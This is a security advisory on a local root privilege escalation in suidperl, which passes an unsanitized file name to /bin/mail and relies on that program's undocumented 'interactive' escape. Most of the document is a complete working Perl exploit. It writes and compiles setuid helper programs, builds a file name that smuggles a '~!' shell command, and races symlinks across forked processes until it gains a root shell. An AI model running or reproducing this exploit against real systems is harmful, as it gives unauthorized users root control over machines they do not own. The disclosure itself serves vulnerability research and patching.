source: http://www.securityfocus.com/bid/1547/info

The interaction between some security checks performed by suidperl, the setuid version of perl, and the /bin/mail program creates a scenario that allows local malicious users to execute commands with root privileges.

The suidperl program performs a number of checks to make sure it can't be fooled into executing a perl script with root privileges when its not suid root. When one of these checks fails the program will compose a message to the root user. The mail message looks like this:

From: Bastard Operator <root@nimue.tpi.pl>
To: root@nimue.tpi.pl

User 500 tried to run dev 769 ino 343180 in place of dev 769 ino 343183!
(Filename of set-id script was /some/thing, uid 500 gid 500.)

Sincerely,
perl

The name of the script to execute (inserted into the message) is taken from the program's argument list (argv[1]). suidperl executes /bin/mail to inject the message into the mail system. It does so without cleaning the environment or dropping its root privileges. The /bin/mail program has an undocumented feature. By setting the environment variable "interactive" to any value, /bin/mail will interpret the sequence "~!" as an escape sequence to start a shell and execute commands even when the program is not attached to a terminal. The environment variable "interactive" can be also set from ~/.mailrc with a "set interactive" line.

A malicous user can create a file with an escape sequence and commands embedded in the file name, then execute suidperl in such a way that the security check fails. suidperl will send a message to root via /bin/mail with the escape sequence embedded in the message. This will cause /bin/mail to start a root shell and execute the commands.

#!/usr/bin/perl

# In spring 2000 i got a pointer from Dave Dittrich that my own perl-script
# that i used for my EoE IDS used /bin/mail in an insecure way. However,
# Dave told me that it is propably not exploitable. Some month later
# i noticed that suidperl uses the same way to log intrusion-attempts.
# I patched perl.c so that i could test the vuln without the race. After some
# hard nights i found, that it was possible. The thing that made the exploit possible
# was mail's hidden feature 'interactive'. I contacted some friends and
# we all agreed that the exploit wouldn't be the easiest. However, after contacting
# Michal too, he showed that we have been wrong. :)
# Michal wrote the first exploit (shell-script) but it failed on my BSD box.
# So i ported it to perl. Below the initial comment from his exploit:


#
#    -- PLEASE READ THESE COMMENTS CAREFULLY BEFORE TRYING ANYTHING --
#
# Wonderful, lovely, world-smashing, exciting perl exploit. It works against
# +s suidperl, exploiting undocumented /bin/mail feature when perl wants to
# notify root on inode race conditions. Currently, tested under RH Linux.
#
# What's probably most shocking, buggy code has following comment inside:
# /* heh, heh */. I guess author wasn't laughning last.
#
# Development history of this exploit is really funny. I found this condition
# about 4 months ago, but thought it's useless (who wants to notify root?).
# I deleted my test code and didn't left any notes on it. Then, month after
# this discovery, Sebastian contacted me. He was working on perl exploit.
# He told me he don't know how to cause this condition to happen, but
# if he realise how he can do it, he'll be able to use undocumented /bin/mail
# feature - environmental variable 'interactive', which, if set, causes
# /bin/mail to interpret ~! commands (subshell requests) even if stdin is not
# on terminal. And then I understood what I've done. I spent next month
# (yes! no kidding!) trying to recall what the fsck was the condition. I
# remembered it was trivial, even annoying... And finally, now I'm able to
# reconstruct it.
#
# This exploit tries to fit in rather short, but reasonable time window in
# order to exploit it. I tested it on fast, not overloaded Linux box, and
# I guess on slow machines it needs tunning. It needs anything setuid
# (/usr/bin/passwd is just fine), writable working directory and something
# around 4 minutes. Working directory should be mounted without noexec or
# nosuid options (if so, find something like /var/lib/svgalib etc).
#
# WARNING: On slow machines, it's quite possible this exploit will cause
# heavy load. Please test it when system is not overloaded and not used
# (eg. at night).
#
#
# I'd like to thank Sebastian Krahmer for his help (in fact, HE discovered it
# - I think I can say it without shame), and especially thank to several of
# my braincells that survived monitor radiation and made me recall this
# race condition.
#
# Send comments, ideas and flames to <lcamtuf@ids.pl>
# Tested with sperl 5.00503, but should work with any other as well.
#
# Good luck and don't abuse it.
#

# The warnings also apply to this program. FOR EDUCATIONAL PURPOSES ONLY!!!
# Greetings as usual: You all know who you are :))
# S.

sub REAPER
{
	while (waitpid(-1, WNOHANG) > 0) {
	}
}

$SIG{CHLD} = \&REAPER;

print "\n\nSuidperl 5.00503 (and newer) root exploit\n".
      "-----------------------------------------\n".
      "Bugdiscovery & Exploit by Sebastian Krahmer <krahmer\@cs.uni-potsdam.de>\n".
      "With [even greater] respect to Michal Zalewski, who wrote the first exploit!\n\n";

$suidperl = `which suidperl`;

if ((stat($suidperl))[2] & 04000 != 04000) {
	print "No +s suidperl found.\n Aborting.\n";
	return;
}

print "Your choice is $suidperl\n";

print "When you need to quit this program, just type\n".
      "'killall -9 hack.pl' on a second console.\n\n";

chdir("/tmp");
open O, ">flare1" or die "$!";
print O<<_EOF_;
#!/usr/bin/suidperl

print "I know!\n";
_EOF_

close O;

open O, ">flare2" or die "$!";
print O<<_EOF_;
#!/usr/bin/suidperl

print "I know!";
_EOF_

close O;


open O,">littlehole.c" or die "$!";
print O<<_EOF_;
int main()
{
	setuid(0);
	setgid(0);
	chown("boomsh", 0, 0);
	chmod("boomsh", 06755);
	return 0;
}
_EOF_
close O;


open O, ">boomsh.c" or die "$!";
print O<<_EOF_;
int main()
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}

_EOF_
close O;

chmod 04700, "flare1" or die "$!";
chmod 04700, "flare2" or die "$!";

`cc -o boomsh boomsh.c`;
`cc -o littlehole littlehole.c`;

print "OK. All pre-race stuff done. Starting race ...\n".
      "Please be patient. It can take some minutes.\n".
      "You can safely ignore error-messages like 'No such file ...'\n";


$filename = 'foo

~!littlehole

';

$ENV{interactive}=1;
$ENV{PATH}.= ":.";

$p = $$;

fork();

fork();
fork();

# maybe comment this out if box is slow
fork();
#fork();

# the idea is simple (hey, i dont know why i didn't got this
# idea before Michal! :)
# We just fork off some suidperls with 2 different
# inputfiles. Then the bruting change of symlinks will
# hopefully hit on of the suidperl's race.
# chances are good.
while (((stat("boomsh"))[2] & 04000) != 04000) {
		unlink($filename);
		symlink("/tmp/flare1", $filename);
		
		system("nice -20 \"$filename\">/dev/null &");
		
		unlink($filename);
		symlink("/tmp/flare2", $filename);
		
		system("nice -20 \"$filename\">/dev/null &");
}

print "OK. /tmp/boomsh is setuid root!\n";

# the first one wins the prize :)
if ($p != $$) {
	exit(0); 
}

system("/tmp/boomsh");

